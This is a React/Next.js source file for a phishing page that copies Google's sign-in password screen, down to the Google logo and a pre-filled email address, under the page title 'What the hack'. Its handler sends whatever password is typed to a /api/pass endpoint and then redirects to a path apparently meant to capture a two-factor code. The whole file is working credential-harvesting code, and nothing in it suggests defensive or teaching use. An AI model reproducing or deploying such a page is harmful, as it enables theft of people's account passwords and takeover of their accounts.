"use client";

import Image from "next/image";
import { useEffect, useState } from "react";
import Head from "next/head";
import { useRouter } from "next/navigation";
// import local file

export default function Home() {
  const [showPass, setShowPass] = useState(false);
  const [isEmailFill, setIsEmailFill] = useState(false);
  const [pass, setPass] = useState("");
  const route = useRouter();

  const makeApicall = async () => {
    await fetch("/api/pass", {
      method: "POST",
      body: JSON.stringify({ pass }),
    });
  };

  const chakInput = (e) => {
    if (e.target.value != "") {
      setIsEmailFill(true);
      setPass(e.target.value);
    } else if (e.target.value == "") {
      setIsEmailFill(false);
    }
  };

  const chackShowPass = (e) => {
    if (e.target.checked) {
      setShowPass(true);
    } else setShowPass(false);
  };

  const handleNextBtn = () => {
    makeApicall();
    if (isEmailFill) {
      route.push("/google/tow-fector");
    } else {
      // fill error
    }
  };
  return (
    <div className="h-screen w-full">
      <Head>
        <title>What the hack</title>
      </Head>
      <div className="m-auto h-full md:min-w-[460px] min-w-full items-center justify-center flex-col flex w-auto">
        <div className="text-center text-sm flex flex-col justify-center md:border md:border-black-google  w-fit rounded-md px-8 py-10">
          <div className="align-middle flex items-center justify-center ">
            <svg
              viewBox="0 0 75 24"
              width="75"
              height="24"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              className="BFr46e xduoyf"
            >
              <g id="qaEJec">
                <path
                  fill="#ea4335"
                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
                ></path>
              </g>
              <g id="YGlOvc">
                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
              </g>
              <g id="BWfIk">
                <path
                  fill="#4285f4"
                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
                ></path>
              </g>
              <g id="e6m3fd">
                <path
                  fill="#fbbc05"
                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
                ></path>
              </g>
              <g id="vbkDmc">
                <path
                  fill="#ea4335"
                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
                ></path>
              </g>
              <g id="idEJde">
                <path
                  fill="#4285f4"
                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
                ></path>
              </g>
            </svg>
          </div>
          <h1 className="text-[1.5rem] my-1 mt-2">Sing in</h1>
          <div className="flex flex-row items-center m-auto gap-2 border border-gray-300 rounded-full px-1 mt-3 mb-10 hover:bg-slate-100 cursor-default py-[.1rem]">
            <svg
              className=" max-h-[20px] h-5 w-fit"
              aria-hidden="true"
              class="stUf5b"
              fill="currentColor"
              focusable="false"
              width="48px"
              height="48px"
              viewBox="0 0 24 24"
              xmlns="https://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
            </svg>

            <p className="font-[500] text-sm text-[#3c4043] font-sans">
             mdshuvo174249@gmail.com
            </p>
            <div className="max-w-[1rem]">
              <svg
                aria-hidden="true"
                class="stUf5b MSBt4d"
                fill="currentColor"
                focusable="false"
                width="24px"
                height="24px"
                viewBox="0 0 24 24"
                xmlns="https://www.w3.org/2000/svg"
              >
                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
              </svg>
            </div>
          </div>
          <div
            className={`border-2 border-black-google rounded-[4px] focus-within:border-google relative px-2 py-3 w-full transition-colors duration-150 ${
              isEmailFill && "border-google"
            }`}
          >
            <input
              type={showPass ? "text" : "password"}
              className="block w-full peer md:min-w-[330px] min-w-[250px] "
              onChange={chakInput}
            />
            <label
              className={`absolute left-2 -translate-y-1/2 pointer-events-none peer-focus:text-xs peer-focus:text-google peer-focus:top-0 bg-white px-1 py-1 transition-all duration-150  ${
                isEmailFill
                  ? "top-0 text-xs text-google"
                  : "left-2 text-gray-500 top-1/2"
              }  `}
            >
              Enter your password
            </label>
          </div>

          <div className="text-left ml-[.2rem] my-2 flex gap-4 items-center">
            <input
              onSubmit={handleNextBtn}
              type="checkbox"
              onChange={chackShowPass}
              name=""
              id=""
              className="scale-125 bg-red-600"
            />
            Show password
          </div>

          <div className="flex justify-between items-center my-8 mb-16">
            <a href={"/"} type="submit" className="text-google font-semibold">
              Forgot password
            </a>
            <button
              onClick={handleNextBtn}
              className="py-1 px-5 rounded-sm text-white bg-google hover:bg-google-lite"
            >
              Next
            </button>
          </div>
        </div>
        <div className="flex items-center justify-between md:gap-36 mt-2 gap-10">
          <select
            name="language"
            defaultValue={"English"}
            className="bg-transparent active:bg-gray-200 px-2 py-2 text-sm rounded-sm"
          >
            <option value="English">English</option>
            <option value="Spanish">Spanish</option>
            <option value="French">French</option>
            <option value="German">German</option>
            <option value="Italian">Italian</option>
            <option value="Portuguese">Portuguese</option>
            <option value="Dutch">Dutch</option>
            <option value="Swedish">Swedish</option>
            <option value="Norwegian">Norwegian</option>
            <option value="Danish">Danish</option>
            <option value="Finnish">Finnish</option>
            <option value="Russian">Russian</option>
            <option value="Polish">Polish</option>
            <option value="Czech">Czech</option>
            <option value="Slovak">Slovak</option>
            <option value="Hungarian">Hungarian</option>
            <option value="Romanian">Romanian</option>
            <option value="Bulgarian">Bulgarian</option>
            <option value="Greek">Greek</option>
            <option value="Turkish">Turkish</option>
            <option value="Arabic">Arabic</option>
            <option value="Hebrew">Hebrew</option>
            <option value="Persian">Persian</option>
            <option value="Hindi">Hindi</option>
            <option value="Bengali">Bengali</option>
            <option value="Punjabi">Punjabi</option>
            <option value="Urdu">Urdu</option>
            <option value="Chinese">Chinese</option>
            <option value="Japanese">Japanese</option>
            <option value="Korean">Korean</option>
            <option value="Thai">Thai</option>
            <option value="Vietnamese">Vietnamese</option>
            <option value="Indonesian">Indonesian</option>
            <option value="Malay">Malay</option>
            <option value="Tagalog">Tagalog</option>
            <option value="Swahili">Swahili</option>
            <option value="Afrikaans">Afrikaans</option>
            <option value="Zulu">Zulu</option>
            <option value="Xhosa">Xhosa</option>
            <option value="Sotho">Sotho</option>
            <option value="Spanish">Spanish</option>
            <option value="Catalan">Catalan</option>
            <option value="Galician">Galician</option>
            <option value="Basque">Basque</option>
            <option value="Breton">Breton</option>
            <option value="Scottish Gaelic">Scottish Gaelic</option>
            <option value="Irish">Irish</option>
            <option value="Welsh">Welsh</option>
            <option value="Cornish">Cornish</option>
            <option value="Manx">Manx</option>
          </select>
          <div className="flex gap-4 text-sm opacity-80">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  );
}
